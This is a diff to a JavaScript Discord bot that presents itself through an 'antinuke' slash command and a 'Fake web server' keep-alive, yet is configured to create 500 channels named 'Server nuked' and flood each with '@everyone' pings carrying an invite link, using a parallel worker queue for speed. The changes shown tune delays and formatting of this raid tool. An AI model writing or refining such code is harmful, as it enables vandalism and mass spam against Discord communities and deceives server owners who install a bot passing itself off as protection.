@@ -12,7 +12,7 @@ import "dotenv/config";
 /* ===== Fake web server ===== */
 const app = express();
 app.get("/", (req, res) => res.send("Bot online"));
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 0);
 /* =========================== */
 
 const client = new Client({
@@ -25,8 +25,8 @@ const sleep = ms => new Promise(r => setTimeout(r, ms));
 const CHANNEL_NAME = "Server nuked";
 const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 5;
-const DELETE_DELAY = 60;
-const WORKERS = 4; // số worker song song mỗi shard
+const DELETE_DELAY = 50;
+const WORKERS = 4;
 /* ================== */
 
 /* ===== Slash Command ===== */
@@ -55,22 +55,20 @@ client.once("ready", () => {
   console.log(`🤖 Online: ${client.user.tag} | Shard ${client.shard?.ids[0] ?? 0}`);
 });
 
-/* ===== WORKER QUEUE SYSTEM ===== */
+/* ===== Worker Queue ===== */
 class Queue {
   constructor(workers = 4) {
     this.tasks = [];
     this.running = 0;
     this.workers = workers;
   }
-
   add(task) {
     return new Promise((resolve, reject) => {
       this.tasks.push({ task, resolve, reject });
       this.run();
     });
   }
-
-  async run() {
+  run() {
     while (this.running < this.workers && this.tasks.length) {
       const { task, resolve, reject } = this.tasks.shift();
       this.running++;
@@ -84,10 +82,10 @@ class Queue {
     }
   }
 }
-/* =============================== */
 
 const queue = new Queue(WORKERS);
 
+/* ===== Antinuke logic giữ nguyên ===== */
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
   if (interaction.commandName !== "antinuke") return;
@@ -136,7 +134,6 @@ client.on("interactionCreate", async interaction => {
           name: CHANNEL_NAME,
           type: ChannelType.GuildText
         });
-
         for (let k = 0; k < MSG_PER_CHANNEL; k++) {
           await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
         }
